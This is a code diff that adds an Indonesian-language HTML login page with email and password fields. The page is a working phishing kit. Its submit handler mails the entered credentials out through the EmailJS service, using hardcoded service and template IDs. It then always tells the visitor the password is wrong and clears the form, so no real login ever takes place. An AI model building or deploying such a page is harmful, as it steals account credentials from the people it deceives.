@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login dengan EmailJS</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("TRy9YTmDzwU4wmb3n"); // Public Key EmailJS
+    })();
+  </script>
+  <style>
+    :root{
+      --bg: #f3f4f6;
+      --card: #ffffff;
+      --primary: #2563eb;
+      --primary-hover: #1e40af;
+      --muted: #555;
+      --radius-card: 12px;
+      --input-font: 16px;
+      --card-width: 420px;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: var(--bg);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+    }
+
+    .login-box {
+      position: relative;
+      background: var(--card);
+      padding: 2rem;
+      border-radius: var(--radius-card);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: var(--card-width);
+      min-width: 260px;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 1rem;
+      max-width: 50px;
+      height: auto;
+      border-radius: 100%;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+    }
+
+    .login-box input[type="email"],
+    .login-box input[type="password"] {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      font-size: var(--input-font);
+      border: 1px solid #d1d5db;
+      border-radius: 10px;
+      outline: none;
+      transition: box-shadow .12s ease, border-color .12s ease;
+    }
+
+    .login-box input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(37,99,235,0.12);
+    }
+
+    .login-box button {
+      margin-top: 6px;
+      height: 44px;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 16px;
+    }
+    .login-box button:hover { background: var(--primary-hover); }
+
+    .forgot {
+      margin-top: 10px;
+      text-align: center;
+    }
+    .forgot a {
+      color: var(--primary);
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+
+    /* Notifikasi */
+    .notification {
+      position: absolute;
+      top: -60px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fef3c7;
+      color: #92400e;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .3s ease, top .3s ease;
+    }
+    .notification.show {
+      top: -40px;
+      opacity: 1;
+    }
+    .notification.success {
+      background: #d1fae5;
+      color: #065f46;
+    }
+    .notification.error {
+      background: #fee2e2;
+      color: #991b1b;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <div id="notification" class="notification">Pesan notifikasi</div>
+
+    <img src="logo.png" alt="Logo" class="logo" />
+
+    <form id="login-form">
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Masuk</button>
+    </form>
+
+    <div class="forgot">
+      <a href="reset.html">Lupa Kata Sandi?</a>
+    </div>
+
+    <div class="try-login" style="margin-top:15px; text-align:center; font-size:14px;">
+      <a href="Id.html" style="color:#2563eb; text-decoration:none; font-weight:500;"
+         onmouseover="this.style.textDecoration='underline'"
+         onmouseout="this.style.textDecoration='none'">
+        Ingin mencoba login ID ?
+      </a>
+    </div>
+  </div>
+
+  <script>
+    const notif = document.getElementById("notification");
+
+    function showNotification(message, type="error") {
+      notif.innerText = message;
+      notif.className = "notification show " + type;
+      setTimeout(() => {
+        notif.className = "notification " + type; 
+      }, 3000);
+    }
+
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_4nvem9j", "template_2iey2f4", this)
+        .then(() => {
+          showNotification("Sandi yang anda masukkan salah");
+          this.reset();
+        }, (error) => {
+          showNotification("Terdapat masalah: " + error.text, "error");
+        });
+    });
+  </script>
+
+</body>
+</html>
